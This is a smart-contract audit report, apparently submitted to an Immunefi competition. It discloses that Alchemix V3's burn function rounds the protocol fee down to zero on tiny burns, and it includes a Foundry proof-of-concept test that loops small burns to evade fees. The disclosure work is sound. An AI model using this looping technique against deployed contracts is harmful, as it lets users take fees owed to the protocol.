# 58323 sc critical the alchemist burn function experiences precision loss resulting in the avoidance of protocol fees

**Submitted on Nov 1st 2025 at 09:18:15 UTC by @pashap9990 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58323
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Finding Description and Impact

CDP holders can reduce their debt through `Alchemist::burn`. Furthermore, they are required to remit a fee to the protocol, which is deducted from their collateral. However, CDP holders can evade paying fees to the protocol, resulting in the theft of fees due to precision losses.

### Code snippet

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L483>

### Textual PoC

Suppose mtoken --> debt token rate is `1:1` and the protocol fee is 100 \[1%].

* User A deposits 100e18 mToken as collateral and gets 50e18 alToken as debt.
* User A calls `Alchemist::burn` with 10 as the debt amount in the next block.

```
_accounts[recipientId].collateralBalance -= convertDebtTokensToYield(credit) * protocolFee / BPS;
10 * 100 / 10_000 = 0.1 --> which rounds down to zero
```

It's evident that the user's debt decreased, whereas the user didn't pay any fee.

## Proof of Concept

## Proof of Concept

Kindly incorporate the following PoC in `Alchemist.t.sol`

```solidity
    function testBurnFunctionSufferFromPrecisionLoss() external {
        uint256 amount = 100e18;

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
        alchemist.deposit(amount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId, amount / 2, address(0xbeef));

        vm.roll(block.number + 1);

        SafeERC20.safeApprove(address(alToken), address(alchemist), amount);
        (uint256 beforeCollateral, uint256 beforeUserDebt,) = alchemist.getCDP(tokenId);
        uint i = 0;
        while(i < 1000){
            alchemist.burn(10, tokenId);
            i++;
        }
        vm.stopPrank();

        (uint256 afterCollateral, uint256 afterUserDebt,) = alchemist.getCDP(tokenId);

        assertEq(beforeCollateral, afterCollateral);
        assertLe(afterUserDebt, beforeUserDebt);
    }
```
